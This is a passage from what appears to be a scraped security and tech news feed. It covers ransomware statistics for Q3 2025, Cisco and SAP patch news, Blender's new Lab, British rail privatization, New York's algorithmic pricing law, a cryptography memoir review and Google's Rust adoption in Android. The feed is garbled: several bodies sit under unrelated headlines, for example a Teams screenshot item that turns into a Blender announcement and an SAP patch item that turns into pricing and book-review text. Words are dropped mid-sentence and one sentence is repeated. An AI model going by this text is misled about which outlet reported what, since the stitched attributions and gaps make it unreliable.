This incident illustrates the range of motivations operating within large RaaS ecosystems. While affiliates enjoy broad autonomy, Qilin demonstrates a degree of central oversight and reputational management, removing politically sensitive cases that may jeopardize its long-term operations. The group continues to balance open recruitment and strategic control, maintaining its position as a leading and resilient RaaS brand.]]></content:encoded></item><item><title>The State of Ransomware – Q3 2025</title><link>https://research.checkpoint.com/2025/the-state-of-ransomware-q3-2025/</link><author>samanthar@checkpoint.com</author><category>threatintel</category><pubDate>Thu, 13 Nov 2025 14:33:49 +0000</pubDate><source url="https://research.checkpoint.com/">Check Point Research</source><content:encoded><![CDATA[Record fragmentation and decentralization: The number of active extortion groups in Q3 2025 rose to a record of 85 groups, the highest number observed to date.

The group continues to balance open recruitment and strategic control, maintaining its position as a leading and resilient RaaS brand.Geographic Distribution of Victims – Q3 2025The geographic distribution of ransomware victims in Q3 2025 continues to follow established trends in the global ransomware ecosystem. The United States accounted for roughly half of all reported cases, reaffirming its position as the primary target for financially motivated threat actors. Most publicly listed victims remain concentrated in Western, developed economies, where organizations are perceived as having greater financial resources and a higher likelihood of paying ransom.Figure 14- Publicly Claimed Victims by Countries, Q3 2025.An unusual concentration of attacks in South Korea elevated the country to seventh place on the list of most affected nations this quarter. This spike is linked almost entirely to Qilin, which listed 30 South Korean victims, 28 of them between August and September 2025. Of these, 23 belonged to the financial services sector. While the cause of this focused campaign remains uncertain, the Korea Herald newspaper attributed it to a compromised cloud server operated by an IT contractor serving multiple mid-sized private equity funds.Safepay maintained a strong focus on Germany and the United Kingdom, with each accounting for approximately 10% of its total victims in Q3. Together with INC Ransom, which also recorded 11 British victims, these two groups were the most active in the UK, followed closely by Qilin with 10.Twenty percent of DragonForce’s victims were based in Germany, making it the most active ransomware group in the country.INC Ransom reported a notably high proportion of Canadian victims (8%), the largest share of any group targeting Canadian organizations this quarter.Figure 15- Canadian Victims by Actor, Q3 2025.Ransomware Attacks by Industry – Q3 2025 AnalysisThe industry distribution of ransomware victims in Q3 2025 shows a consistent cross-sector impact, largely unchanged from previous quarters. Profit-oriented organizations with high downtime costs, such as industrial manufacturing, and those holding sensitive or regulated data, such as business services, remained the most targeted sectors, each representing approximately 10% of all extortion attempts.Healthcare and medical organizations continue to face steady targeting due to the critical nature of their operations and the sensitivity of stored information. Interestingly, threat actors view these victims as high-risk targets because of the attention such incidents attract from law enforcement. In Q2 2025, healthcare accounted for approximately 8% of all publicly listed victims, a figure that remained stable through Q3.While some groups, such as Play Ransomware, appear to enforce an internal policy against attacking healthcare institutions, others such as Qilin, INC Ransomware, and KillSec continue to list healthcare providers among their victims, disregarding the informal ethical boundaries observed by larger RaaS brands. – Ransomware Victims by Industry, Q3 2025.The ransomware ecosystem in  remains highly active and structurally fragmented, while at the same time increasingly adaptive. The dissolution of major RaaS programs did not reduce the overall volume of attacks but instead  among numerous smaller and more agile actors. Groups such as  and  have capitalized on this trend, expanding through aggressive affiliate recruitment and service innovation.  signals a potential trend toward  around trusted brands.Despite periodic law-enforcement disruptions, the fundamental dynamics of the ransomware market, using affiliate-driven operations, data extortion models, and cross-platform tooling, remain intact. Continued monitoring of affiliate migration patterns and emerging extortion techniques are essential to understanding how this decentralized ecosystem evolves through the remainder of 2025.]]></content:encoded></item><item><title>“Patched” but still exposed: US federal agencies must remediate Cisco flaws (again)</title><link>https://www.helpnetsecurity.com/2025/11/13/cisa-directive-cve-2025-20333-cve-2025-20362/</link><author></author><category>security</category><pubDate>Thu, 13 Nov 2025 14:08:01 +0000</pubDate><source url="https://cvefeed.io/rssfeed/newsroom.xml">Latest Newsroom</source><content:encoded><![CDATA[“Patched” but still exposed: US federal agencies must remediate Cisco flaws (again)]]></content:encoded></item><item><title>Microsoft rolls out screen capture prevention for Teams users</title><link>https://www.bleepingcomputer.com/news/microsoft/microsoft-rolls-out-screen-capture-prevention-for-teams-users/</link><author>Sergiu Gatlan</author><category>security</category><pubDate>Thu, 13 Nov 2025 13:50:58 +0000</pubDate><source url="https://www.bleepingcomputer.com/">BleepingComputer</source><content:encoded><![CDATA[Microsoft is rolling out a new Teams feature for Premium customers that will automatically block screenshots and recordings during meetings.

If every active Blender user contributed $5 this month, Blender Foundation would meet its entire yearly funding goal for 2026.Introducing an innovation space within the Blender project, where designers and developers can work together on challenging or future-facing projects, to keep Blender relevant in the years to come.Over the years, Blender has grown and matured into a powerful and complex piece of software. With its unstoppable release cycle, a massive, highly demanding, and diverse user community, natural technical debt, and complex technical dependencies, shipping new features and general improvements requires more and more effort and coordination.Software stability and reliability have become critical for individuals and companies. As a consequence, development efforts focus on those aspects, offering progressive improvements of existing functionality only when these are clear enhancements of what is already there.This makes it more challenging to innovate, think outside the box, experiment, and break things.To facilitate this essential aspect of product development, the Blender Foundation is establishing a new project: the Blender Lab. This is the innovation space where designers, developers, and researchers work together on challenging and future-facing projects that will help Blender stay relevant in the years to come.A lab activity is a project that brings innovation to the Blender project, and contributes to Blender Foundation’s mission. The project should face some unknowns, but also be handled by a team or individual with sufficient domain knowledge to solve them. Lab activities are meant to be independent of Blender releases.Lab activities are always public and visible on blender.org/lab. Here the ongoing projects are presented, sharing objectives, timeline and participants. Intermediate builds for testing and feedback will be available here as well.First batch, and more examplesTo get started with this initiative, here are some projects that qualify, and that are listed:Beyond mouse and keyboard (touch and pen)Beyond mouse and keyboard (VR/XR)Some more projects that could be added soon:AI and ML technologies, starting with a Blender MCP serverApplied vs. Academic researchLab activities can be grouped in two categories:Applied research, which is the main focus of the lab. Developing and eventually shipping groundbreaking solutions based on the latest research and knowledge in the fieldAcademic research. For example, this can be achieved by participating in projects organized by institutions such as universities and research centers, where Blender developers offer an advisory role on how technology can be implemented in production software.How do I make my project a Lab project?The goal is to start with a limited number of projects, assessed by Blender Foundation with the support of key Blender contributors. During the course of 2026, more guidelines will be defined and shared. If you are interested in submitting a proposal for a Lab project, you can do so by contacting Blender Foundation and sharing a public document where you describe the project and make a compelling case for it. The adoption of a project depends on many factors, including funds availability, relevance to the Blender missions, experience of the applicant, and more.Special credit goes to Ton Roosendaal for advocating for this project since 2018. At the time the Blender project was not able to allocate resources to the initiative, but today, thanks to growing community and corporate support there starts to be a path for it. Future campaigns and partnerships will be crucial for the success of this project. You can make this happen by joining the Blender Development Fund at fund.blender.org.Francesco SiddiBlender FoundationSupport the Future of BlenderDonate to Blender by joining the Development Fund to support the Blender Foundation’s work on core development, maintenance, and new releases.]]></content:encoded></item><item><title>Britain&apos;s railway privatization was an abject failure</title><link>https://www.rosalux.de/en/news/id/53917/britains-railway-privatization-was-an-abject-failure</link><author>robtherobber</author><category>dev</category><pubDate>Thu, 13 Nov 2025 13:34:38 +0000</pubDate><source url="https://news.ycombinator.com/best">Best of HackerNews</source><content:encoded><![CDATA[Liberalization of the railways has been a key tenet of European transport policy since the early 2000s, with proponents claiming that competition results in improved service quality and increased ridership. This is an instantly disprovable statement given that ridership was already on the rise across Europe prior to, rather than after, liberalization efforts, suggesting other effects are at play. is an award-winning railway engineer and writer. He is the author of the internationally bestselling book How The Railways Will Fix the Future and co-founder of the Campaign for Level Boarding.On the other hand, the case against fragmented and privatized operations focuses on three key arguments. The first is that railways are complex systems where commercial boundaries at engineering interfaces are a threat to safety and efficiency. The second is that railway operations are geographic monopolies where market conditions are — at best — contrived. The third is that railways are a public service that cannot fail — hence, introducing private interests into the railways is merely a way to sequester income into private hands while the state shoulders the financial risk. In other words, private interests’ role is simply to extract profit that could otherwise be reinvested into the system.The United Kingdom was one of first countries in Europe to liberalize a significant portion of its railways (Northern Ireland’s railways remained publicly owned and operated). As such, the aftermath of privatization is instructive in tracing liberalization’s final destination. In short: it isn’t pretty.Selling the Family SilverThe UK’s contiguous network in Wales, Scotland, and England was privatized in stages between 1988 and 1997, starting with its domestic train manufacturing industry. This took place following a massive self-off of public assets in the aftermath of the broader financialization of the British economy. For example, the water industry in England and Wales was wholly divested through the 1980s — something no other country has ever done. Thanks to archived papers from then Prime Minister Margaret Thatcher, we can understand precisely what the political drivers for mass privatization were.First, as a large employer of over 50,000 staff, divesting the water industry would greatly contribute to “the privatisation programme”. Second, it would take necessary investment in an ageing asset off the public books. Finally, it would increase shareholding in the public, mitigate state interference, and create financial assets for trade. It is worth noting that none of these justifications took the quality or expansion of services into account.And so, we turn back to railways. In 1990, things had been looking up for British Rail. Ridership had been climbing solidly since the mid-1980s. The average subsidy was as low as 20 percent of running costs, making the British system one of the most efficient in Europe. Urban, regional, and high-speed rail projects were being delivered or, in the latter case, were in serious development.Three rolling stock operating companies bought — at rock-bottom prices — an enormous range of hugely valuable trains for which British Rail had scrimped and saved over the preceding decades.Then the early-1990s recession hit. More than a decade of constrained public spending and service sell-offs meant there was an immediate impact on passenger numbers, sending the government into a panic. Suddenly, the Thatcherite doctrine of “sell everything but the railways” was thrown out the window, and plans for privatization were put in motion.In July 1992, a white paper entitled “New Opportunities for the Railways” was published, heavily informed by Treasury mandarins and their advisers at the Tufton Street-based Adam Smith Institute in London. It recommended nothing less than an atomization of the formerly integrated railway operating structure, with the creation of as many independent elements as possible to maximize perceived opportunities for competition.On 1 April 1994, the Railways Act came into effect and the demise of British Rail began. It is worth noting that privatization had already started in the 1980s, for example with the sale of the train manufacturers in Derby and various ferry operations. But the 1990s was different — this was a fire sale.The first private entity to be created was Railtrack, which took over the railway infrastructure such as track, signals, and stations. Seven infrastructure maintenance units and six track renewal units were set up to split off maintenance from operation. Six freight operating companies were created. Twenty-five train operating units were also established, which from 1996 onwards were franchised out to the train operating companies.Three rolling stock operating companies (ROSCOs) bought — at rock-bottom prices — an enormous range of hugely valuable trains for which British Rail had scrimped and saved over the preceding decades. They then leased these back to the train operators at eye-watering cost and with little oversight, enabling a significant outflow of cash from the industry. This has incentivized one of British passengers’ biggest gripes — the widespread use of trains that are as short as possible to minimize leasing costs, without a care for the resulting overcrowding.Another impact of the ROSCOs landing a large, cheap asset that they could rent out at high prices was the near-death of the UK train manufacturing industry, as there was no incentive to continue British Rail's programme of fleet renewals. In the aftermath of privatization, only British Rail’s partially fulfilled orders remained on the books, and new passenger trains wouldn't be built at volume until the early 2000s, resulting in the demise of all but the Derby works. At great cost, new plants have opened in Newton Aycliffe and Newport since, but even these are once again under threat thanks to the lack of any long-term rolling stock strategy.All franchises had been awarded, a plethora of regulating and organizing bodies had been established to hold the system together, and privatization was essentially complete by 1 April 1997, achieving the outgoing administration’s goal of completing the process by the next general election. Despite promises to the contrary, New Labour’s coming into power did not result in a reversal of the process.Franchise agreements, now managed by the Department for Transport, were growing more complex and more restrictive.However, in September 1997, an express train collided with a freight train in Southall, London, killing seven people and injuring 139 others. A lack of effective communication between the fragmented elements of the railway was the root cause of the horrific crash, the first of a series of serious fatal derailments that were attributable to the new structure of the railways.In October 1999, the death of 31 people and the injury of 417 others at Ladbroke Grove, London, resulted in a cascade of changes to safety regulation. The derailment of an express train at Hatfield in October 2000 killed four people and injured 70, sending shockwaves through the industry as it had resulted directly from Railtrack’s self-perception as a contract management organization, not an engineering outfit. This fomented the demise of Railtrack, which was absorbed into a new government body called Network Rail. A gargantuan and rushed effort to replace thousands of miles of substandard track materials followed, requiring billions of pounds of additional funds and greatly impacting passenger numbers for several years.Another fatal derailment at Potters Bar in May 2002 killed seven people and was caused by the negligence of a private maintenance company. This led to the return of many maintenance tasks in-house under Network Rail. With the process of Railtrack’s reconstitution as Network Rail completing in October 2002, the UK’s rail infrastructure had been de facto renationalized.The West Coast Main Line had long been considered the jewel in the crown of the British rail network, having been electrified and modernized through the 1950s, 1960s, and 1970s. By 1998, passenger growth was putting significant pressure on the route, and Virgin’s Richard Branson wanted to introduce new tilting trains and a much more frequent timetable. By 2002, costs had risen from 2.5 billion to 14.5 billion pounds (just short of 30 billion pounds in today’s money), and the scope of the project had been severely curtailed. What started in 1998 as a promise for a 140-miles-per-hour railway with fully digital signalling had descended into chaos by the early 2000s, contributing to Railtrack’s demise.By this point, railways were at their most popular since the beginning of the previous century. Passenger numbers were skyrocketing, and a cross-party consensus agreed that rail investment and the expansion of the rail network were a good thing. Franchises previously let as “not for growth” such as those in Wales and the North were creaking at the seams as people turned to trains.Franchise agreements, now managed by the Department for Transport, were growing more complex and more restrictive. The number of bidders reduced, and the ambition of their bids increased. This came to a head in 2009, when National Express was stripped of the East Coast franchise after failing to meet its payment targets despite continuing passenger growth.In 2012, the West Coast bidding process was scrapped by government and was awarded as a short-term concession pending a review, and amidst a wider crisis across the industry in June 2018, the East Coast franchise — subsequently awarded to yet another optimistic bid by Virgin — also collapsed and had to be returned to state operation. By this point, franchise bidders were few and far between, and the system was close to collapse.Railways must be set into the bigger transport picture with ambitious targets — mobility in totality, not rail in isolation.These increasingly overambitious bids, combined with ever-more complex and controlling contracts, left only one lever open to the train operators to cut costs: staffing. From 2016 onwards, a wave of increasingly disruptive strikes took hold of the network, as terms and conditions were altered to attempt to reduce the number of staff the train operating companies had to have on their books.Just as the industry’s new structure had resulted in the creation of the ROSCOs, which incentivised a freeze in new train procurement, the creation of Railtrack and its private suppliers resulted in a freeze in recruitment across the infrastructure domain. Crudely, when you have a fleet of trains that already run the service, why build new ones? The same ended up being broadly true for infrastructure — why employ new staff when you already have an enormous workforce?A decade-wide gap in skills was the consequence. With the growth in passenger demand came a huge growth in the number of infrastructure projects being carried out, and this skills bottleneck, combined with an industry structure that exacerbated costs by maximizing the number of organizational interfaces, meant work was being delivered too slowly and at too high a price. Cost escalations became unbearable for government in 2017 and resulted not only in the curtailment of the national electrification programme, but also in the abandonment of other enhancements across the country, particularly in and around the north of England. Meanwhile, there was a glut of new train orders, many for new electric trains for which there were no longer overhead wires planned to power them.May 2018 was supposed to be the moment that an enormous leap in capacity was created. New track and trains would enable a great leap in the number of trains running in the timetable. As it happened, neither the track nor the trains were in place to deliver much of this uplift, and the result was a collapse in the system’s reliability. Driver training could not happen, and a lack of trains, tracks, and staff resulted in the cancellation of upwards of one third of services in the South East and the north of England, with lesser but significant effects felt by passengers across the network.Long an opponent of the franchise system and the lack of integration between track and train, then Secretary of State for Transport Chris Grayling initiated the Williams Review in 2018 to work out what shape the industry needed to be in to enable growth without cycling back to calamity. This review took time to pick up speed, leaving the industry in perpetual crisis mode.The Final Nail in the CoffinIn March 2020, the COVID-19 pandemic reduced ridership to 5 percent of pre-COVID levels and the industry was placed on life support. By the end of that month, all franchises were transferred onto emergency concessions, and the franchise system was gone. This was made official in September 2020, as the government stated that franchising was to cease to exist, and by April 2021 the National Audit Office announced that train operators were to be officially classified as state-owned, despite the continued involvement of private companies. The irony of a Conservative than a Labour government beginning the re-integration of the system should not be lost on readers — indeed, this is a recurring theme.Finally, in May 2021, the Williams—Shapps Plan for Rail was published, setting out a loose view of the future structure of the railways. Although lacking in details, the headline was that a new organization called Great British Railways (GBR) was to be created. A transition team was established to understand what GBR would do and how it would be structured. The ROSCOs, as the last major vestige of the Railways Act 1993, remained untouched.Roll forwards seven years and, despite several train operators being controlled directly by the Department for Transport, there is still no clear picture of what GBR will be empowered or funded to do, let alone what its structure and intentions will be. Meanwhile, a general election has worsened, not improved, the outlook for the railway industry, as the number of major projects continues to fall alongside ongoing maintenance funding. Capacity is more squeezed than ever before.The rail industry needs democratization, so that decisions about the railways we use are made closer to us. Despite the public’s continued support for publicly owned railways — 75% in 2025 compared with 60% in 2017 — the extent to which “nationalization” will achieve democratic oversight and the necessary reinvigoration of the industry remains unclear. Britain’s rail unions are cautiously supportive, but it is worth noting that scepticism has grown as the Labour Party drifts further to the centre.The rail industry needs democratization, so that decisions about the railways we use are made closer to us. That means moving power, including over spending, away from Westminster. Democratic accountability at local and regional levels is key to unlocking the cycle of proposed and cancelled investment, and in pushing operators to do better. That means devolution of decision and funding powers to both the regions and cities, but also delivering sufficient industry funding autonomy so that it can respond quickly to these demands and rise above electoral cycles and fiscal anxiety.Railways must be set into the bigger transport picture with ambitious targets — mobility in totality, not rail in isolation. Moreover, investment must be matched to those targets to build a railway that more people can use and benefit from — more capacity, more reliability and more accessibility.Empowerment of the rail industry as a self-governing entity accountable chiefly to the UK’s regions and cities rather than to central government is a critical step in kicking things out of crisis mode and reshaping the industry to be fit for the long-term future. But as important is the need for the railways to tell a story about themselves that the public can get behind. Only with an ambitious and exciting vision of the future will the railways fulfil their true potential. Privatization, as the British experience shows, utterly failed to do so.]]></content:encoded></item><item><title>SAP Pushes Emergency Patch for 9.9 Rated CVE-2025-42887 After Full Takeover Risk</title><link>https://hackread.com/sap-patch-cve-2025-42887-takeover-vulnerability/</link><author></author><category>security</category><pubDate>Thu, 13 Nov 2025 13:10:24 +0000</pubDate><source url="https://cvefeed.io/rssfeed/newsroom.xml">Latest Newsroom</source><content:encoded><![CDATA[

Think again. Your price might be different based on everything from your location to what you’ve looked at online. Companies often use algorithms to set their prices that rely heavily on customers’ personal data. Now, the state of New York is forcing companies to come clean when they set prices using customer data.Anyone using algorithms to adjust pricing for people in the state must now reveal when they’re doing it, thanks to legislation that the state began enforcing this week called the Algorithmic Pricing Disclosure Act.Algorithmic pricing is also known as “surveillance pricing” because it relies on using a person’s personal data to offer them promotional pricing (or potentially higher prices, if the vendor thinks they’ll pay).How software algorithms affect the prices you seeThe Federal Trade Commission (FTC) warned about this in a report that it released in January this year. It had ordered eight companies (Mastercard, Revionics, Bloomreach, JPMorgan Chase, Task Software, PROS, Accenture, and McKinsey) to disclose the services they offer that use algorithms and consumer data to set or recommend individualized prices, as well as the data inputs, customer lists and potential impact on consumer pricing. From the report:“A tool could be used to collect real-time information about a person’s browsing and transaction history and enable a company to offer—or not offer—promotions based on that consumer’s perceived affinity.” This data could include where they are, who they are, what they’re doing, and what they’ve done in the past. The report suggests that companies could use a wide variety of customer data to achieve these goals, including everything from their geolocation to what they’ve looked at on a particular website.For example, lingering over a particular item with their mouse or watching a certain percentage of a video on a website might alert companies that a consumer has a particular interest.The same data could be used to create “buckets” of customers with similar profiles (called “segments” in marketing) that companies could use to target people with different pricing.The FTC report had to use hypothetical examples, following push-back from the companies involved, but what it revealed was enlightening. A company might jack up prices of baby formula offered to a parent found searching for fast delivery, it said.In another imagined case, a person visiting a car dealership and using an in-store kiosk to explore vehicles might be segmented as a first-time car buyer, the report said. The store might decide that they’re inexperienced about the financing options available, affecting the rates that they’re offered.The FTC had issued a Request for Information (RFI) on the report, asking people for their own experiences of surveillance pricing. The public comment period was supposed to run until April 17, but the new FTC chair under the Trump administration, Andrew Ferguson, closed the RFI less than a week after the previous chair, Lina Khan, issued it.Last week the state’s Attorney General, Letitia James, effectively re-opened it—at least for New York residents. She issued a consumer alert urging residents to help enforce the law, which threatens a $1,000 penalty each time a company violates it. The alert encouraged people to report companies they believe are using algorithms to determine pricing.Under the New York law, businesses must display the exact text: “This price was set by an algorithm using your personal data.” They must display the text near the price shown, and they can’t use “protected class data” that is legally shielded from discrimination under the law. That includes ethnicity, national origin, disability, age, sex, sexual orientation, or gender identity. There are exceptions: insurance companies and other financial institutions are exempt under the Gramm-Leach-Bliley Act.A long history of algorithmic pricingAlgorithmic pricing has been happening for years. For example, in 2013 Staples was found to be adjusting prices for different people according to their distance from a rival’s store. The retailer reportedly charged higher prices for households with lower incomes, although whether this was intentional or just an unintended by-product of the algorithm isn’t clear. That’s the problem though: algorithms can easily have unexpected results.This pushback against surveillance pricing is spreading. California’s AB 325 bill amends the state’s Cartwright Act antitrust law to ban shared pricing algorithms that use competitor data between multiple businesses. Governor Gavin Newsom signed that into law last month, and it will take effect on January 1, 2026. He also passed SB 763, which increases civil and criminal penalties for violations of the Cartwright Act.Cybersecurity risks should never spread beyond a headline.

Nobody knew anything. The manufacturers didn’t know whether the cryptography they sold was any good. The customers didn’t know whether the crypto they bought was any good. Everyone pretended to know, thought they knew, or knew better than to even try to know. is the self-published memoirs of Fred Kinch. He was founder and vice president of—mostly sales—at a US cryptographic hardware company called Datotek, from company’s founding in 1969 until 1982. It’s mostly a disjointed collection of stories about the difficulties of selling to governments worldwide, along with descriptions of the highs and (mostly) lows of foreign airlines, foreign hotels, and foreign travel in general. But it’s also about encryption.Datotek sold cryptographic equipment in the era after rotor machines and before modern academic cryptography. The company initially marketed computer-file encryption, but pivoted to link encryption—low-speed data, voice, fax—because that’s what the market wanted.These were the years where the NSA hired anyone promising in the field, and routinely classified—and thereby blocked—publication of academic mathematics papers of those they didn’t hire. They controlled the fielding of strong cryptography by aggressively using the International Traffic in Arms regulation. Kinch talks about the difficulties in getting an expert license for Datotek’s products; he didn’t know that the only reason he ever got that license was because the NSA was able to break his company’s stuff. He had no idea that his largest competitor, the Swiss company Crypto AG, was owned and controlled by the CIA and its West German equivalent. “Wouldn’t that have made our life easier if we had known that back in the 1970s?” Yes, it would. But no one knew.Glimmers of the clandestine world peek out of the book. Countries like France ask detailed tech questions, borrow or buy a couple of units for “evaluation,” and then disappear again. Did they break the encryption? Did they just want to see what their adversaries were using? No one at Datotek knew.Kinch “carried the key generator logic diagrams and schematics” with him—even today, it’s good practice not to rely on their secrecy for security—but the details seem laughably insecure: four linear shift registers of 29, 23, 13, and 7 bits, variable stepping, and a small nonlinear final transformation. The NSA probably used this as a challenge to its new hires. But Datotek didn’t know that, at the time.Kinch writes: “The strength of the cryptography had to be accepted on trust and only on trust.” Yes, but it’s so, so weird to read about it in practice. Kinch demonstrated the security of his telephone encryptors by hooking a pair of them up and having people listen to the encrypted voice. It’s rather like demonstrating the safety of a food additive by showing that someone doesn’t immediately fall over dead after eating it. (In one absolutely bizarre anecdote, an Argentine sergeant with a “hearing defect” could understand the scrambled analog voice. Datotek fixed its security, but only offered the upgrade to the Argentines, because no one else complained. As I said, no one knew anything.)In his postscript, he writes that even if the NSA could break Datotek’s products, they were “vastly superior to what [his customers] had used previously.” Given that the previous devices were electromechanical rotor machines, and that his primary competition was a CIA-run operation, he’s probably right. But even today, we know nothing about any other country’s cryptanalytic capabilities during those decades.A lot of this book has a “you had to be there” vibe. And it’s mostly tone-deaf. There is no real acknowledgment of the human-rights-abusing countries on Datotek’s customer list, and how their products might have assisted those governments. But it’s a fascinating artifact of an era before commercial cryptography went mainstream, before academic cryptography became approved for US classified data, before those of us outside the triple fences of the NSA understood the mathematics of cryptography.This book review originally appeared in AFIO.]]></content:encoded></item><item><title>CISA warns feds to fully patch actively exploited Cisco flaws</title><link>https://www.bleepingcomputer.com/news/security/cisa-warns-feds-to-fully-patch-actively-exploited-cisco-flaws/</link><author>Sergiu Gatlan</author><category>security</category><pubDate>Thu, 13 Nov 2025 12:05:55 +0000</pubDate><source url="https://www.bleepingcomputer.com/">BleepingComputer</source><content:encoded><![CDATA[CISA warned federal agencies to fully patch two actively exploited vulnerabilities in Cisco Adaptive Security Appliances (ASA) and Firepower devices.

This year we look at how this approach isn’t just fixing things, but helping us move faster.

The 2025 data continues to validate the approach, with memory safety vulnerabilities falling below 20% of total vulnerabilities for the first time.
Updated data for 2025. This data covers first-party and third-party (open source) code changes to the Android platform across C, C++, Java, Kotlin, and Rust. This post is published a couple of months before the end of 2025, but Android’s industry-standard 90-day patch window means that these results are very likely close to final. We can and will accelerate patching when necessary.
We adopted Rust for its security and are seeing a 1000x reduction in memory safety vulnerability density compared to Android’s C and C++ code. But the biggest surprise was Rust's impact on software delivery. With Rust changes having  and spending 25% less time in code review, the safer path is now also the faster one. 

In this post, we dig into the data behind this shift and also cover:
How we’re expanding our reach: We're pushing to make secure code the default across our entire software stack. We have updates on Rust adoption in first-party apps, the Linux kernel, and firmware.Our first rust memory safety vulnerability...almost: We'll analyze a near-miss memory safety bug in unsafe Rust: how it happened, how it was mitigated, and steps we're taking to prevent recurrence. It’s also a good chance to answer the question “if Rust can have memory safety issues, why bother at all?”
Developing an operating system requires the low-level control and predictability of systems programming languages like C, C++, and Rust. While Java and Kotlin are important for Android platform development, their role is complementary to the systems languages rather than interchangeable. We introduced Rust into Android as a direct alternative to C and C++, offering a similar level of control but without many of their risks. We focus this analysis on new and actively developed code because our data shows this to be an effective approach.

When we look at development in systems languages (excluding Java and Kotlin), two trends emerge: a steep rise in Rust usage and a slower but steady decline in new C++.
Net lines of code added: Rust vs. C++, first-party Android code.This chart focuses on first-party (Google-developed) code (unlike the previous chart that included all first-party and third-party code in Android.) We only include systems languages, C/C++ (which is primarily C++), and Rust.
The chart shows that the volume of new Rust code now rivals that of C++, enabling reliable comparisons of software development process metrics. To measure this, we use the DORA framework, a decade-long research program that has become the industry standard for evaluating software engineering team performance. DORA metrics focus on:
Throughput: the velocity of delivering software changes.Stability: the quality of those changes.
Cross-language comparisons can be challenging. We use several techniques to ensure the comparisons are reliable.
Similar sized changes: Rust and C++ have similar functionality density, though Rust is slightly denser. This difference favors C++, but the comparison is still valid. We use Gerrit’s change size definitions.Similar developer pools: We only consider first-party changes from Android platform developers. Most are software engineers at Google, and there is considerable overlap between pools with many contributing in both.Track trends over time: As Rust adoption increases, are metrics changing steadily, accelerating the pace, or reverting to the mean? 
Code review is a time-consuming and high-latency part of the development process. Reworking code is a primary source of these costly delays. Data shows that Rust code requires fewer revisions. This trend has been consistent since 2023. Rust changes of a similar size need about 20% fewer revisions than their C++ counterparts.

In addition, Rust changes currently spend about 25% less time in code review compared to C++. We speculate that the significant change in favor of Rust between 2023 and 2024 is due to increased Rust expertise on the Android team.

While less rework and faster code reviews offer modest productivity gains, the most significant improvements are in the stability and quality of the changes.

Stable and high-quality changes differentiate Rust. DORA uses rollback rate for evaluating change stability. Rust's rollback rate is very low and continues to decrease, even as its adoption in Android surpasses C++.
For medium and large changes, the rollback rate of Rust changes in Android is ~4x lower than C++. This low rollback rate doesn't just indicate stability; it actively improves overall development throughput. Rollbacks are highly disruptive to productivity, introducing organizational friction and mobilizing resources far beyond the developer who submitted the faulty change. Rollbacks necessitate rework and more code reviews, can also lead to build respins, postmortems, and blockage of other teams. Resulting postmortems often introduce new safeguards that add even more development overhead.
In a self-reported survey from 2022, Google software engineers reported that Rust is both easier to review and more likely to be correct. The hard data on rollback rates and review times validates those impressions.

Historically, security improvements often came at a cost. More security meant more process, slower performance, or delayed features, forcing trade-offs between security and other product goals. The shift to Rust is different: we are significantly improving security  key development efficiency and product stability metrics. 

With Rust support now mature for building Android system services and libraries, we are focused on bringing its security and productivity advantages elsewhere. 
First-party applications: Rust is ensuring memory safety from the ground up in several security-critical Google applications, such as:Nearby Presence: The protocol for securely and privately discovering local devices over Bluetooth is implemented in Rust and is currently running in Google Play Services.MLS: The protocol for secure RCS messaging is implemented in Rust and will be included in the Google Messages app in a future release.Chromium: Parsers for PNG, JSON, and web fonts have been replaced with memory-safe implementations in Rust, making it easier for Chromium engineers to deal with data from the web while following the Rule of 2.These examples highlight Rust's role in reducing security risks, but memory-safe languages are only one part of a comprehensive memory safety strategy. We continue to employ a defense-in-depth approach, the value of which was clearly demonstrated in a recent near-miss.

We recently avoided shipping our very first Rust-based memory safety vulnerability: a linear buffer overflow in CrabbyAVIF. It was a near-miss. To ensure the patch received high priority and was tracked through release channels, we assigned it the identifier CVE-2025-48530. While it’s great that the vulnerability never made it into a public release, the near-miss offers valuable lessons. The following sections highlight key takeaways from our postmortem.
Scudo Hardened Allocator for the Win
A key finding is that Android’s Scudo hardened allocator deterministically rendered this vulnerability non-exploitabledue to guard pages surrounding secondary allocations. While Scudo is Android’s default allocator, used on Google Pixel and many other devices, we continue to work with partners to make it mandatory. In the meantime, we will issue CVEs of sufficient severity for vulnerabilities that could be prevented by Scudo.

In addition to protecting against overflows, Scudo’s use of guard pages helped identify this issue by changing an overflow from silent memory corruption into a noisy crash. However, we did discover a gap in our crash reporting: it failed to clearly show that the crash was a result of an overflow, which slowed down triage and response. This has been fixed, and we now have a clear signal when overflows occur into Scudo guard pages.
Unsafe Review and Training
Operating system development requires unsafe code, typically C, C++, or unsafe Rust  (for example, for FFI and interacting with hardware), so simply banning unsafe code is not workable. When developers must use unsafe, they should understand how to do so soundly and responsibly

To that end, we are adding a new deep dive on unsafe code to our Comprehensive Rust training. This new module, currently in development, aims to teach developers how to reason about unsafe Rust code, soundness and undefined behavior, as well as best practices like safety comments and encapsulating unsafe code in safe abstractions.

Better understanding of unsafe Rust will lead to even higher quality and more secure code across the open source software ecosystem and within Android. As we'll discuss in the next section, our unsafe Rust is already really quite safe. It’s exciting to consider just how high the bar can go.

This near-miss inevitably raises the question: "If Rust can have memory safety vulnerabilities, then what’s the point?"

The point is that the density is drastically lower. So much lower that it represents a major shift in security posture. Based on our near-miss, we can make a conservative estimate. With roughly 5 million lines of Rust in the Android platform and one potential memory safety vulnerability found (and fixed pre-release), our estimated vulnerability density for Rust is 0.2 vuln per 1 million lines (MLOC).

Our historical data for C and C++ shows a density of closer to 1,000 memory safety vulnerabilities per MLOC. Our Rust code is currently tracking at a density orders of magnitude lower: a more than 1000x reduction.
Memory safety rightfully receives significant focus because the vulnerability class is uniquely powerful and (historically) highly prevalent. High vulnerability density undermines otherwise solid security design because these flaws can be chained to bypass defenses, including those specifically targeting memory safety exploits. Significantly lowering vulnerability density does not just reduce the number of bugs; it dramatically boosts the effectiveness of our entire security architecture.

The primary security concern regarding Rust generally centers on the approximately 4% of code written within  blocks. This subset of Rust has fueled significant speculation, misconceptions, and even theories that unsafe Rust might be more buggy than C. Empirical evidence shows this to be quite wrong.

Our data indicates that even a more conservative assumption, that a line of unsafe Rust is as likely to have a bug as a line of C or C++, significantly overestimates the risk of unsafe Rust. We don’t know for sure why this is the case, but there are likely several contributing factors:
unsafe{} doesn't actually disable all or even most of Rust’s safety checks (a common misconception).The practice of encapsulation enables local reasoning about safety invariants.The additional scrutiny that unsafe{} blocks receive.
Historically, we had to accept a trade-off: mitigating the risks of memory safety defects required substantial investments in static analysis, runtime mitigations, sandboxing, and reactive patching. This approach attempted to move fast and then pick up the pieces afterwards. These layered protections were essential, but they came at a high cost to performance and developer productivity, while still providing insufficient assurance.

